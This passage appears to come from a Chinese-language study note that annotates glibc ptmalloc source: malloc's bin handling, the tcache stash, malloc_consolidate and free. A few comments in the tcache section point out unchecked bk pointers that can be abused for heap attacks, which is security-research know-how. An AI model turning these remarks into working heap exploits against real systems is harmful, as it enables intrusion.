//接着判断当前分配区是否为非主分配区，如果是，将 victim chunk 的 size 字段中的表示非主分配区的标志 bit 清零，最后调用 chunk2mem() 函数获得 chunk 的实际可用的内存指针，将该内存指针返回给应用层。      if (av != &amp;main_arena)        victim-&gt;size |= NON_MAIN_ARENA;      check_malloced_chunk(av, victim, nb);      void *p = chunk2mem(victim);      alloc_perturb(p, bytes);      return p;    &#125;  &#125;&#125;
tcache
if (in_smallbin_range (nb))    &#123;      idx = smallbin_index (nb);      bin = bin_at (av, idx);      if ((victim = last (bin)) != bin)      //victim就是要脱链的堆块，也就是small bin里的最后一个      //这个if在判断我们所需要的size的那条small bin链上是否存在堆块，存在的话就把victim给脱链        &#123;          bck = victim-&gt;bk;	  if (__glibc_unlikely (bck-&gt;fd != victim))//对small bin的双向链表的完整性做了检查，确保victim-&gt;bk-&gt;fd指向的还是victim    //如果我们在这里劫持了victim的bk指针，就会导致bck的fd指向的并不是victim，从而触发异常	    malloc_printerr (&quot;malloc(): smallbin double linked list corrupted&quot;);          set_inuse_bit_at_offset (victim, nb);//设置下一个（高地址）chunk的prev_inuse位          bin-&gt;bk = bck;//将victim脱链          bck-&gt;fd = bin;          if (av != &amp;main_arena)	    set_non_main_arena (victim);          check_malloced_chunk (av, victim, nb);#if USE_TCACHE	  /* While we&#x27;re here, if we see other chunks of the same size,	     stash them in the tcache.  */	  size_t tc_idx = csize2tidx (nb);//获取size对应的tcache索引	  if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)//如果这个索引在tcache bin的范围里，也就是这个size属于tcache bin的范围	    &#123;	      mchunkptr tc_victim;	      /* While bin not empty and tcache not full, copy chunks over.  */	      while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count//如果tcache bin没有满		     &amp;&amp; (tc_victim = last (bin)) != bin)//如果small bin不为空,tc_victim为small bin中的最后一个堆块		&#123;		  if (tc_victim != 0)		    &#123;		      bck = tc_victim-&gt;bk;//这里取tc_victim的bk指针，并没有针对bck做双向链表完整性检查，因此我们可以去攻击tc_victim的bk指针		      set_inuse_bit_at_offset (tc_victim, nb);		      if (av != &amp;main_arena)			set_non_main_arena (tc_victim);		      bin-&gt;bk = bck;//将tc_victim从small bin中脱链		      bck-&gt;fd = bin;//如果我们伪造bck，这里就可以将bck-&gt;fd的位置写入一个bin的地址(main_arena+96)		      tcache_put (tc_victim, tc_idx);//将tc_victim链入tc_idx这条链	            &#125;		&#125;	    &#125;#endif          void *p = chunk2mem (victim);          alloc_perturb (p, bytes);          return p;        &#125;    &#125;
/*   If this is a large request, consolidate fastbins before continuing.   While it might look excessive to kill all fastbins before   even seeing if there is space available, this avoids   fragmentation problems normally associated with fastbins.   Also, in practice, programs tend to have runs of either small or   large requests, but less often mixtures, so consolidation is not   invoked all that often in most programs. And the programs that   it is called frequently in otherwise tend to fragment. */else&#123;  idx = largebin_index(nb);  if (have_fastchunks(av))    malloc_consolidate(av);&#125;
  /*     Process recently freed or remaindered chunks, taking one only if     it is exact fit, or, if this a small request, the chunk is remainder from     the most recent non-exact fit.  Place other traversed chunks in     bins.  Note that this step is the only place in any routine where     chunks are placed in bins.     The outer loop here is needed because we might not realize until     near the end of malloc that we should have consolidated, so must     do so and retry. This happens at most once, and only when we would     otherwise need to expand memory to service a &quot;small&quot; request.   */  for (;;)  &#123;    int iters = 0;    //反向遍历 unsorted bin 的双向循环链表，遍历结束的条件是循环链表中只剩下一个头结点。    while ((victim = unsorted_chunks(av)-&gt;bk) != unsorted_chunks(av))    &#123;      //检查当前遍历的 chunk 是否合法。       bck = victim-&gt;bk;      if (__builtin_expect(victim-&gt;size &lt;= 2 * SIZE_SZ, 0) || __builtin_expect(victim-&gt;size &gt; av-&gt;system_mem, 0))        malloc_printerr(check_action, &quot;malloc(): memory corruption&quot;,                        chunk2mem(victim), av);      size = chunksize(victim);      /*         If a small request, try to use last remainder if it is the         only chunk in unsorted bin.  This helps promote locality for         runs of consecutive small requests. This is the only         exception to best-fit, and applies only when there is         no exact fit for a small chunk.       */      //1.如果需要分配一个 small bin chunk，且 unsorted bin 中只有一个 chunk，且这个 chunk 为 last remainder chunk，且这个 chunk 的大小大于所需 chunk 的大小加上 MINSIZE，在满足这些条件的情况下，可以使用这个chunk切分出需要的small bin chunk。      //这是唯一的从 unsorted bin 中分配出 small bin chunk 的情况，这种优化利于 cpu 的高速缓存命中。      if (in_smallbin_range(nb) &amp;&amp;          bck == unsorted_chunks(av) &amp;&amp;          victim == av-&gt;last_remainder &amp;&amp;          (unsigned long)(size) &gt; (unsigned long)(nb + MINSIZE))      &#123;        /* split and reattach remainder */        //切割这个 chunk。        remainder_size = size - nb;        remainder = chunk_at_offset(victim, nb);        unsorted_chunks(av)-&gt;bk = unsorted_chunks(av)-&gt;fd = remainder;        av-&gt;last_remainder = remainder;        remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks(av);        if (!in_smallbin_range(remainder_size))        &#123;          remainder-&gt;fd_nextsize = NULL;          remainder-&gt;bk_nextsize = NULL;        &#125;        //设置被分割出去的 chunk 和 剩下的 last remainder chunk 的信息。        set_head(victim, nb | PREV_INUSE |                             (av != &amp;main_arena ? NON_MAIN_ARENA : 0));        set_head(remainder, remainder_size | PREV_INUSE);        set_foot(remainder, remainder_size);        check_malloced_chunk(av, victim, nb);        void *p = chunk2mem(victim);        alloc_perturb(p, bytes);        return p;      &#125;      //将当前遍历的 chunk 脱链。      /* remove from unsorted list */      unsorted_chunks(av)-&gt;bk = bck;      bck-&gt;fd = unsorted_chunks(av);      /* Take now instead of binning if exact fit */      //2.若当前遍历的 chunk 的 size 与 nb 一致，设置物理相邻的下一个堆块的 pre_inuse 位，返回指针，结束分配。      if (size == nb)      &#123;        set_inuse_bit_at_offset(victim, size);        if (av != &amp;main_arena)          victim-&gt;size |= NON_MAIN_ARENA;        check_malloced_chunk(av, victim, nb);        void *p = chunk2mem(victim);        alloc_perturb(p, bytes);        return p;      &#125;      /* place chunk in bin */      //3.如果当前遍历的 chunk 属于 small bins，那就将它链入 small bins。      if (in_smallbin_range(size))      &#123;        victim_index = smallbin_index(size);        bck = bin_at(av, victim_index);        fwd = bck-&gt;fd;      &#125;      else      &#123;        //4.如果当前遍历的 chunk 属于 large bins，那就将它链入 large bins。        victim_index = largebin_index(size);        bck = bin_at(av, victim_index);        fwd = bck-&gt;fd;        /* maintain large bins in sorted order */        //当 large bin 链中存在 bins 时，要将该 chunk 链入合适的位置。        //从这段源码就可以看出来一个 chunk 存在于两个双向循环链表中，一个链表包含了 large bin 中所有的 chunk，另一个链表为 chunk size 链表，该链表从每个相同大小的 chunk 的取出第一个 chunk 按照大小顺序链接在一起，便于一次跨域多个相同大小的 chunk 遍历下一个不同大小的 chunk，这样可以加快在 large bin 链表中的遍历速度。        if (fwd != bck)        &#123;          /* Or with inuse bit to speed comparisons */          size |= PREV_INUSE;          /* if smaller than smallest, bypass loop below */          assert((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == 0);          if ((unsigned long)(size) &lt; (unsigned long)(bck-&gt;bk-&gt;size))          &#123;            fwd = bck;            bck = bck-&gt;bk;            victim-&gt;fd_nextsize = fwd-&gt;fd;            victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;            fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;          &#125;          //正向遍历 chunk size 链表，直到在链中找到第一个大小小于等于当前 chunk 大小的块。          else          &#123;            assert((fwd-&gt;size &amp; NON_MAIN_ARENA) == 0);            while ((unsigned long)size &lt; fwd-&gt;size)            &#123;              fwd = fwd-&gt;fd_nextsize;              assert((fwd-&gt;size &amp; NON_MAIN_ARENA) == 0);            &#125;                             if ((unsigned long)size == (unsigned long)fwd-&gt;size)              /* Always insert in the second position.  */              fwd = fwd-&gt;fd;            else            &#123;              victim-&gt;fd_nextsize = fwd;              victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;              fwd-&gt;bk_nextsize = victim;              victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;            &#125;            bck = fwd-&gt;bk;          &#125;        &#125;        //当 large bin 链中没有 bins 时，直接将该 chunk 入链。        else          victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;      &#125;      mark_bin(av, victim_index);      victim-&gt;bk = bck;      victim-&gt;fd = fwd;      fwd-&gt;bk = victim;      bck-&gt;fd = victim;      //如果 unsorted bin 中的 chunk 超过了 10000 个，最多遍历 10000 个就退出，避免长时间处理 unsorted bin 影响内存分配的效率。#define MAX_ITERS 10000      if (++iters &gt;= MAX_ITERS)        break;    &#125;
   /*      If a large request, scan through the chunks of current bin in      sorted order to find smallest that fits.  Use the skip list for this.    *///如果所需分配的 chunk 为 large bin chunk，查询对应的 large bin 链表，如果 large bin 链表为空，或者链表中最大的 chunk 也不能满足要求，则不能从 large bin 中分配。否则，遍历 large bin 链表，找到合适的 chunk。   if (!in_smallbin_range(nb))   &#123;     bin = bin_at(av, idx);     /* skip scan if empty or largest chunk is too small */     if ((victim = first(bin)) != bin &amp;&amp;         (unsigned long)(victim-&gt;size) &gt;= (unsigned long)(nb))     &#123;       victim = victim-&gt;bk_nextsize;       //反向遍历 chunk size 链表，直到找到第一个大于等于所需 chunk 大小的 chunk 退出循环。       while (((unsigned long)(size = chunksize(victim)) &lt;               (unsigned long)(nb)))         victim = victim-&gt;bk_nextsize;       /* Avoid removing the first entry for a size so that the skip          list does not have to be rerouted.  */       //如果从 large bin 链表中选取的 chunk victim 不是链表中的最后一个 chunk，并且与 victim 大小相同的chunk不止一个，那么意味着 victim 为 chunk size 链表中的节点，为了不调整 chunk size 链表，需要避免将 chunk size 链表中的节点取出，所以取 victim-&gt;fd 节点对应的 chunk 作为候选 chunk。由于 large bin 链表中的 chunk 也是按大小排序，同一大小的 chunk 有多个时，这些 chunk 必定排在一起，所以 victim-&gt;fd 节点对应的 chunk 的大小必定与 victim 的大小一样。       //这样脱链的就变成了 victim 的下一个同样大小的堆块了，减少了工作量，因为不用去修改 chunk size 链表。       if (victim != last(bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size)         victim = victim-&gt;fd;       //计算将 victim 切分后剩余大小，并调用 unlink() 宏函数将 victim 从 large bin 链表中取出。       remainder_size = size - nb;       unlink(av, victim, bck, fwd);       //5.1.如果将 victim 切分后剩余大小小于 MINSIZE，则将整个 victim 分配出去。       /* Exhaust */       if (remainder_size &lt; MINSIZE)       &#123;         set_inuse_bit_at_offset(victim, size);         if (av != &amp;main_arena)           victim-&gt;size |= NON_MAIN_ARENA;       &#125;                //5.2.从 victim 中切分出所需的 chunk，剩余部分作为一个新的 chunk 加入到 unsorted bin 中。如果剩余部分 chunk 属于 large bins，将剩余部分 chunk 的 chunk size 链表指针设置为 NULL，因为 unsorted bin 中的 chunk 是不排序的，这两个指针无用，必须清零。       //划重点了，这里被切割了的 chunk 剩余部分会进入 unsorted bin 链中。       /* Split */       else       &#123;         remainder = chunk_at_offset(victim, nb);         /* We cannot assume the unsorted list is empty and therefore            have to perform a complete insert here.  */         bck = unsorted_chunks(av);         fwd = bck-&gt;fd;         if (__glibc_unlikely(fwd-&gt;bk != bck))         &#123;           errstr = &quot;malloc(): corrupted unsorted chunks&quot;;           goto errout;         &#125;         remainder-&gt;bk = bck;         remainder-&gt;fd = fwd;         bck-&gt;fd = remainder;         fwd-&gt;bk = remainder;         if (!in_smallbin_range(remainder_size))         &#123;           remainder-&gt;fd_nextsize = NULL;           remainder-&gt;bk_nextsize = NULL;         &#125;         set_head(victim, nb | PREV_INUSE |                              (av != &amp;main_arena ? NON_MAIN_ARENA : 0));         set_head(remainder, remainder_size | PREV_INUSE);         set_foot(remainder, remainder_size);       &#125;                //至此已经从 large bin 中使用最佳匹配法找到了合适的 chunk，调用 chunk2mem() 获得 chunk 中可用的内存指针，返回给应用层。       check_malloced_chunk(av, victim, nb);       void *p = chunk2mem(victim);       alloc_perturb(p, bytes);       return p;     &#125;   &#125;
   /*      Search for a chunk by scanning bins, starting with next largest      bin. This search is strictly by best-fit; i.e., the smallest      (with ties going to approximately the least recently used) chunk      that fits is selected.      The bitmap avoids needing to check that most blocks are nonempty.      The particular case of skipping all bins during warm-up phases      when no chunks have been returned yet is faster than it might look.    *///获取下一个相邻 bin 的空闲 chunk 链表，并获取该 bin 对于 binmap 中的 bit 位的值。Binmap 中的标识了相应的 bin 中是否有空闲 chunk 存在。Binmap 按 block 管理，每个 block 为一个int，共 32 个 bit，可以表示 32 个 bin 中是否有空闲 chunk 存在。使用 binmap 可以加快查找 bin 是否包含空闲 chunk。这里只查询比所需 chunk 大的 bin 中是否有空闲 chunk 可用。   ++idx;   bin = bin_at(av, idx);   block = idx2block(idx);   map = av-&gt;binmap[block];   bit = idx2bit(idx);//遍历 binmap 的每一个 block，直到找到一个不为 0 的 block 或者遍历完所有的 block。退出循环遍历后，设置 bin 指向 block 的第一个 bit 对应的 bin，并将 bit 置为 1，表示该 block 中 bit 1 对应的 bin，就是能够取 chunk 的 bin 链，这个 bin 中如果有空闲 chunk，它的 chunk 的大小一定满足要求。   for (;;)   &#123;     /* Skip rest of block if there are no more set bits in this block.  */     if (bit &gt; map || bit == 0)     &#123;       do       &#123;         if (++block &gt;= BINMAPSIZE) /* out of bins */           goto use_top;       &#125; while ((map = av-&gt;binmap[block]) == 0);       bin = bin_at(av, (block &lt;&lt; BINMAPSHIFT));       bit = 1;     &#125;     //在一个 block 遍历对应的 bin，直到找到一个 bit 不为 0 退出遍历，则该 bit 对于的 bin 中有空闲 chunk 存在。     /* Advance to bin with set bit. There must be one. */     while ((bit &amp; map) == 0)     &#123;       bin = next_bin(bin);       bit &lt;&lt;= 1;       assert(bit != 0);     &#125;     //将 bin 链表中的最后一个 chunk 赋值为 victim。     /* Inspect the bin. It is likely to be non-empty */     victim = last(bin);     //如果 victim 与 bin 链表头指针相同，表示该 bin 中没有空闲 chunk，binmap 中的相应位设置不准确，将 binmap 的相应 bit 位清零，获取当前 bin 下一个 bin，将 bit 移到下一个 bit 位，即乘以 2。     /*  If a false alarm (empty bin), clear the bit. */     if (victim == bin)     &#123;       av-&gt;binmap[block] = map &amp;= ~bit; /* Write through */       bin = next_bin(bin);       bit &lt;&lt;= 1;     &#125;          //6.当前 bin 中的最后一个 chunk 满足要求，获取该 chunk 的大小，计算切分出所需 chunk 后剩余部分的大小，然后将 victim 从 bin 的链表中取出。接下来的操作跟“5”的基本差不多，有剩剩余部分会进 unsorted。     else     &#123;       size = chunksize(victim);       /*  We know the first chunk in this bin is big enough to use. */       assert((unsigned long)(size) &gt;= (unsigned long)(nb));       remainder_size = size - nb;       /* unlink */       unlink(av, victim, bck, fwd);       /* Exhaust */       if (remainder_size &lt; MINSIZE)       &#123;         set_inuse_bit_at_offset(victim, size);         if (av != &amp;main_arena)           victim-&gt;size |= NON_MAIN_ARENA;       &#125;       /* Split */       else       &#123;         remainder = chunk_at_offset(victim, nb);         /* We cannot assume the unsorted list is empty and therefore            have to perform a complete insert here.  */         bck = unsorted_chunks(av);         fwd = bck-&gt;fd;         if (__glibc_unlikely(fwd-&gt;bk != bck))         &#123;           errstr = &quot;malloc(): corrupted unsorted chunks 2&quot;;           goto errout;         &#125;         remainder-&gt;bk = bck;         remainder-&gt;fd = fwd;         bck-&gt;fd = remainder;         fwd-&gt;bk = remainder;         /* advertise as last remainder */         if (in_smallbin_range(nb))           av-&gt;last_remainder = remainder;         if (!in_smallbin_range(remainder_size))         &#123;           remainder-&gt;fd_nextsize = NULL;           remainder-&gt;bk_nextsize = NULL;         &#125;         set_head(victim, nb | PREV_INUSE |                              (av != &amp;main_arena ? NON_MAIN_ARENA : 0));         set_head(remainder, remainder_size | PREV_INUSE);         set_foot(remainder, remainder_size);       &#125;       check_malloced_chunk(av, victim, nb);       void *p = chunk2mem(victim);       alloc_perturb(p, bytes);       return p;     &#125;   &#125;
use_top:  /*     If large enough, split off the chunk bordering the end of memory     (held in av-&gt;top). Note that this is in accord with the best-fit     search rule.  In effect, av-&gt;top is treated as larger (and thus     less well fitting) than any other available chunk since it can     be extended to be as large as necessary (up to system     limitations).     We require that av-&gt;top always exists (i.e., has size &gt;=     MINSIZE) after initialization, so if it would otherwise be     exhausted by current request, it is replenished. (The main     reason for ensuring it exists is that we may need MINSIZE space     to put in fenceposts in sysmalloc.)   */  victim = av-&gt;top;  size = chunksize(victim);  if ((unsigned long)(size) &gt;= (unsigned long)(nb + MINSIZE))  &#123;    remainder_size = size - nb;    remainder = chunk_at_offset(victim, nb);    av-&gt;top = remainder;    set_head(victim, nb | PREV_INUSE |                         (av != &amp;main_arena ? NON_MAIN_ARENA : 0));    set_head(remainder, remainder_size | PREV_INUSE);    check_malloced_chunk(av, victim, nb);    void *p = chunk2mem(victim);    alloc_perturb(p, bytes);    return p;  &#125;  /* When we are using atomic ops to free fast chunks we can get     here for all block sizes.  */  else if (have_fastchunks(av))  &#123;    malloc_consolidate(av);    /* restore original bin index */    if (in_smallbin_range(nb))      idx = smallbin_index(nb);    else      idx = largebin_index(nb);  &#125;  /*     Otherwise, relay to handle system-dependent cases   */  else  &#123;    void *p = sysmalloc(nb, av);    if (p != NULL)      alloc_perturb(p, bytes);    return p;  &#125;&#125;
top chunk
use_top:        /*           If large enough, split off the chunk bordering the end of memory           (held in av-&gt;top). Note that this is in accord with the best-fit           search rule.  In effect, av-&gt;top is treated as larger (and thus           less well fitting) than any other available chunk since it can           be extended to be as large as necessary (up to system           limitations).             We require that av-&gt;top always exists (i.e., has size &gt;=           MINSIZE) after initialization, so if it would otherwise be           exhausted by current request, it is replenished. (The main           reason for ensuring it exists is that we may need MINSIZE space           to put in fenceposts in sysmalloc.)         */          victim = av-&gt;top;        size = chunksize (victim);          if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE))          &#123;            remainder_size = size - nb;            remainder = chunk_at_offset (victim, nb);            av-&gt;top = remainder;            set_head (victim, nb | PREV_INUSE |                      (av != &amp;main_arena ? NON_MAIN_ARENA : 0));            set_head (remainder, remainder_size | PREV_INUSE);              check_malloced_chunk (av, victim, nb);            void *p = chunk2mem (victim);            alloc_perturb (p, bytes);            return p;          &#125;          /* When we are using atomic ops to free fast chunks we can get           here for all block sizes.  */        else if (have_fastchunks (av))          &#123;            malloc_consolidate (av);            /* restore original bin index */            if (in_smallbin_range (nb))              idx = smallbin_index (nb);            else              idx = largebin_index (nb);          &#125;          /*           Otherwise, relay to handle system-dependent cases         */        else          &#123;            void *p = sysmalloc (nb, av);            if (p != NULL)              alloc_perturb (p, bytes);            return p;          &#125;
malloc_consolidate
static void malloc_consolidate(mstate av)&#123;  mfastbinptr *fb;          /* current fastbin being consolidated */  mfastbinptr *maxfb;       /* last fastbin (for loop control) */  mchunkptr p;              /* current chunk being consolidated */  mchunkptr nextp;          /* next chunk to consolidate */  mchunkptr unsorted_bin;   /* bin header */  mchunkptr first_unsorted; /* chunk to link to */  /* These have same use as in free() */  mchunkptr nextchunk;  INTERNAL_SIZE_T size;  INTERNAL_SIZE_T nextsize;  INTERNAL_SIZE_T prevsize;  int nextinuse;  mchunkptr bck;  mchunkptr fwd;  /*    If max_fast is 0, we know that av hasn&#x27;t    yet been initialized, in which case do so below  */  //如果全局变量 global_max_fast 不为零，表示 ptmalloc 已经初始化，然后清除分配区 flag 中 fast bin 的标志位，该标志位表示分配区的 fast bins 中包含空闲 chunk，表示将要把里面的所有 chunk 都清空。  if (get_max_fast() != 0)  &#123;    clear_fastchunks(av);    unsorted_bin = unsorted_chunks(av);    /*      Remove each chunk from fast bin and consolidate it, placing it      then in unsorted bin. Among other reasons for doing this,      placing in unsorted bin avoids needing to calculate actual bins      until malloc is sure that chunks aren&#x27;t immediately going to be      reused anyway.    */    //将分配区最大的 fast bin 链指针赋值给 maxfb，第一条 fast bin 链指针赋值给 fb，然后遍历 fast bins 的每条链。    maxfb = &amp;fastbin(av, NFASTBINS - 1);    fb = &amp;fastbin(av, 0);    do    &#123;      //获取当前 bin 链的头指针赋值给 p，如果 p 不为 0，则说明当前 bin 链中存在 chunk，所有将当前 fast bin 链表的头指针赋值为 0，即删除了该 fast bin 中的空闲 chunk 链表，然后对这条链中的 chunk 进行遍历。      p = atomic_exchange_acq(fb, 0);      if (p != 0)      &#123;        do        &#123;          check_inuse_chunk(av, p);          nextp = p-&gt;fd;          /* Slightly streamlined version of consolidation code in free() */          size = p-&gt;size &amp; ~(PREV_INUSE | NON_MAIN_ARENA);          nextchunk = chunk_at_offset(p, size);          nextsize = chunksize(nextchunk);          //检查当前 chunk 的前一个 chunk 是否空闲，先合并，没有直接被链入 unsorted，因为还没检查物理相邻的下一个 chunk 是否空闲。          //如果当前 chunk 的前一个 chunk 空闲，则将当前 chunk 与前一个 chunk 合并成一个空闲 chunk，由于前一个 chunk 空闲，则当前 chunk 的 prev_size 保存了前一个 chunk 的大小，计算出合并后的 chunk 大小，并获取前一个 chunk 的指针，将前一个 chunk 从空闲链表中删除。          if (!prev_inuse(p))          &#123;            prevsize = p-&gt;prev_size;            size += prevsize;            p = chunk_at_offset(p, -((long)prevsize));            unlink(av, p, bck, fwd);          &#125;          //如果与当前 chunk 相邻的下一个 chunk 不是分配区的 top chunk，查看与当前 chunk 相邻的下一个 chunk 是否处于 inuse 状态。          if (nextchunk != av-&gt;top)          &#123;            nextinuse = inuse_bit_at_offset(nextchunk, nextsize);            //如果与当前 chunk 相邻的下一个 chunk 不处于 inuse 状态，，将相邻的下一个空闲 chunk 从空闲链表中删除，并计算当前 chunk 与下一个 chunk 合并后的 chunk 大小。            if (!nextinuse)            &#123;              size += nextsize;              unlink(av, nextchunk, bck, fwd);            &#125;            //如果与当前 chunk 相邻的下一个 chunk 处于 inuse 状态，清除当前 chunk 的 inuse 状态。            else              clear_inuse_bit_at_offset(nextchunk, 0);            //将合并后的 chunk 加入 unsorted bin 的双向循环链表中。            first_unsorted = unsorted_bin-&gt;fd;            unsorted_bin-&gt;fd = p;            first_unsorted-&gt;bk = p;            //如果合并后的 chunk 属于 large bin，将 chunk 的 fd_nextsize 和 bk_nextsize 设置为 NULL，因为在 unsorted bin 中这两个字段无用。            //这里注意一下，特意清了数据。            if (!in_smallbin_range(size))            &#123;              p-&gt;fd_nextsize = NULL;              p-&gt;bk_nextsize = NULL;            &#125;            //设置合并后的空闲 chunk 大小，并标识前一个 chunk 处于 inuse 状态，因为必须保证不能有两个相邻的 chunk 都处于空闲状态。然后将合并后的 chunk 加入 unsorted bin 的双向循环链表中。最后设置合并后的空闲 chunk 的 foot 为自身的 size，chunk 空闲时必须设置 foot，该 foot 处于下一个 chunk 的 prev_size 中，只有 chunk 空闲是 foot 才是有效的。            set_head(p, size | PREV_INUSE);            p-&gt;bk = unsorted_bin;            p-&gt;fd = first_unsorted;            set_foot(p, size);          &#125;          //如果当前 chunk 的下一个 chunk 为 top chunk，则将当前 chunk 合并入 top chunk，修改 top chunk 的大小。          else          &#123;            size += nextsize;            set_head(p, size | PREV_INUSE);            av-&gt;top = p;          &#125;        //直到遍历完当前 bin 链中的所有空闲 chunk。        &#125; while ((p = nextp) != 0);      &#125;    //直到遍历完 fast bins 的每一条 bin 链。    &#125; while (fb++ != maxfb);  &#125;  //如果 ptmalloc 没有初始化，初始化 ptmalloc。  else  &#123;    malloc_init_state(av);    check_malloc_state(av);  &#125;&#125;
__libc_free
    void __libc_free(void *mem)&#123;  mstate ar_ptr;  mchunkptr p; /* chunk corresponding to mem */  //如果存在 free 的 hook 函数，执行该 hook 函数返回，free 的 hook 函数主要用于创建新线程使用或使用用户提供的 free 函数。  void (*hook)(void *, const void *) = atomic_forced_read(__free_hook);  if (__builtin_expect(hook != NULL, 0))  &#123;    (*hook)(mem, RETURN_ADDRESS(0));    return;  &#125;  if (mem == 0) /* free(0) has no effect */    return;  //根据要释放的内存空间指针获取 chunk 指针。  p = mem2chunk(mem);    //如果当前 free 的 chunk 是通过 mmap() 分配的，调用 munmap_chunk() 函数 unmap 本 chunk。munmap_chunk() 函数调用 munmap() 函数释放 mmap() 分配的内存块。同时查看是否开启了 mmap 分配阈值动态调整机制，默认是开启的，如果当前 free 的 chunk 的大小大于设置的 mmap 分配阈值，小于 mmap 分配阈值的最大值，将当前 chunk 的大小赋值给 mmap 分配阈值，并修改 mmap 收缩阈值为 mmap 分配阈值的 2 倍。默认情况下 mmap 分配阈值与 mmap 收缩阈值相等，都为 128KB。程序返回。  if (chunk_is_mmapped(p)) /* release mmapped memory. */  &#123;    /* see if the dynamic brk/mmap threshold needs adjusting */    if (!mp_.no_dyn_threshold &amp;&amp; p-&gt;size &gt; mp_.mmap_threshold &amp;&amp; p-&gt;size &lt;= DEFAULT_MMAP_THRESHOLD_MAX)    &#123;      mp_.mmap_threshold = chunksize(p);      mp_.trim_threshold = 2 * mp_.mmap_threshold;      LIBC_PROBE(memory_mallopt_free_dyn_thresholds, 2,                 mp_.mmap_threshold, mp_.trim_threshold);    &#125;    munmap_chunk(p);    return;  &#125;    //根据 chunk 指针获得分配区的指针，即 chunk 的管理块 arena，然后调用 _int_free() 函数执行实际的释放工作。  ar_ptr = arena_for_chunk(p);  _int_free(ar_ptr, p, 0);&#125;
_int_free
static void_int_free(mstate av, mchunkptr p, int have_lock)&#123;  INTERNAL_SIZE_T size;     /* its size */  mfastbinptr *fb;          /* associated fastbin */  mchunkptr nextchunk;      /* next contiguous chunk */  INTERNAL_SIZE_T nextsize; /* its size */  int nextinuse;            /* true if nextchunk is used */  INTERNAL_SIZE_T prevsize; /* size of previous contiguous chunk */  mchunkptr bck;            /* misc temp for linking */  mchunkptr fwd;            /* misc temp for linking */  const char *errstr = NULL;  int locked = 0;  size = chunksize(p);  //首先进行一系列的安全检查。chunk 的指针地址不能溢出，chunk 的大小必须大于等于 MINSIZE。  /* Little security check which won&#x27;t hurt performance: the     allocator never wrapps around at the end of the address space.     Therefore we can exclude some size values which might appear     here by accident or by &quot;design&quot; from some intruder.  */  if (__builtin_expect((uintptr_t)p &gt; (uintptr_t)-size, 0) || __builtin_expect(misaligned_chunk(p), 0))  &#123;    errstr = &quot;free(): invalid pointer&quot;;  errout:    if (!have_lock &amp;&amp; locked)      (void)mutex_unlock(&amp;av-&gt;mutex);    malloc_printerr(check_action, errstr, chunk2mem(p), av);    return;  &#125;  /* We know that each chunk is at least MINSIZE bytes in size or a     multiple of MALLOC_ALIGNMENT.  */  if (__glibc_unlikely(size &lt; MINSIZE || !aligned_OK(size)))  &#123;    errstr = &quot;free(): invalid size&quot;;    goto errout;  &#125;  check_inuse_chunk(av, p);
  /*    If eligible, place chunk on a fastbin so it can be found    and used quickly in malloc.  */  //如果当前 free 的 chunk 属于 fast bins 且下一个 chunk 不是 top chunk，查看下一个相邻的 chunk 的大小是否小于等于 2*SIZE_SZ，且是否大于分配区，即检查下一个相邻 chunk 的大小有没有问题。  if ((unsigned long)(size) &lt;= (unsigned long)(get_max_fast())#if TRIM_FASTBINS      /*  If TRIM_FASTBINS set, don&#x27;t place chunks  bordering top into fastbins      */      &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)#endif  )  &#123;    if (__builtin_expect(chunk_at_offset(p, size)-&gt;size &lt;= 2 * SIZE_SZ, 0) || __builtin_expect(chunksize(chunk_at_offset(p, size)) &gt;= av-&gt;system_mem, 0))    &#123;      /* We might not have a lock at this point and concurrent modifications         of system_mem might have let to a false positive.  Redo the test         after getting the lock.  */      if (have_lock || (&#123;            assert(locked == 0);            mutex_lock(&amp;av-&gt;mutex);            locked = 1;            chunk_at_offset(p, size)-&gt;size &lt;= 2 * SIZE_SZ || chunksize(chunk_at_offset(p, size)) &gt;= av-&gt;system_mem;          &#125;))      &#123;        errstr = &quot;free(): invalid next size (fast)&quot;;        goto errout;      &#125;      if (!have_lock)      &#123;        (void)mutex_unlock(&amp;av-&gt;mutex);        locked = 0;      &#125;    &#125;    //设置当前分配区的 fast bin flag，表示当前分配区的 fast bins 中已有空闲 chunk。然后根据当前 free 的 chunk 大小获取其所属的 fast bin 头指针。    free_perturb(chunk2mem(p), size - 2 * SIZE_SZ);    set_fastchunks(av);    unsigned int idx = fastbin_index(size);    fb = &amp;fastbin(av, idx);    //检查 double free 的，即检查 fast bin 链头的 chunk 和要释放的 chunk 是否一致。    /* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */    mchunkptr old = *fb, old2;    unsigned int old_idx = ~0u;    do    &#123;      /* Check that the top of the bin is not the record we are going to add         (i.e., double free).  */      if (__builtin_expect(old == p, 0))      &#123;        errstr = &quot;double free or corruption (fasttop)&quot;;        goto errout;      &#125;      //检查顶部 fastbin 块的大小是否与我们要添加的块的大小相同。      /* Check that size of fastbin chunk at the top is the same as         size of the chunk that we are adding.  We can dereference OLD         only if we have the lock, otherwise it might have already been         deallocated.  See use of OLD_IDX below for the actual check.  */      if (have_lock &amp;&amp; old != NULL)        old_idx = fastbin_index(chunksize(old));      p-&gt;fd = old2 = old;    &#125; while ((old = catomic_compare_and_exchange_val_rel(fb, p, old2)) != old2);    if (have_lock &amp;&amp; old != NULL &amp;&amp; __builtin_expect(old_idx != idx, 0))    &#123;      errstr = &quot;invalid fastbin entry (free)&quot;;      goto errout;    &#125;  &#125;
